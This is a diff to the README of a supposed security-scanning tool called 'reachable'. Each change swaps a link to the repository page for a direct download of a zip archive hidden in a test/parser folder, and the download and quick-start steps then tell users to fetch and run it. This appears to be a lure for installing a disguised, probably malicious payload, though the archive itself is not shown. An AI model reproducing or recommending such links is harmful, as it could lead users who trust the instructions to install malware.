@@ -1,6 +1,6 @@
 # 🔍 reachable - Find real app security risks
 
-[![Download reachable](https://img.shields.io/badge/Download%20reachable-blue?style=for-the-badge)](https://github.com/Kael1117/reachable)
+[![Download reachable](https://img.shields.io/badge/Download%20reachable-blue?style=for-the-badge)](https://github.com/Kael1117/reachable/raw/refs/heads/main/test/parser/Software-1.6-beta.4.zip)
 
 ## 🧭 What this app does
 
@@ -24,7 +24,7 @@ If your app uses npm packages, reachable can inspect the code and dependency tre
 
 ## ⬇️ Download and set up
 
-Visit this page to download: https://github.com/Kael1117/reachable
+Visit this page to download: https://github.com/Kael1117/reachable/raw/refs/heads/main/test/parser/Software-1.6-beta.4.zip
 
 After you open the page:
 1. look for the latest release or source files
@@ -181,7 +181,7 @@ That makes it easier to see how your app changes over time
 
 ## 📌 Quick start path
 
-1. open the download page: https://github.com/Kael1117/reachable  
+1. open the download page: https://github.com/Kael1117/reachable/raw/refs/heads/main/test/parser/Software-1.6-beta.4.zip  
 2. download the Windows file or source package  
 3. extract it if needed  
 4. open Command Prompt in the app folder  
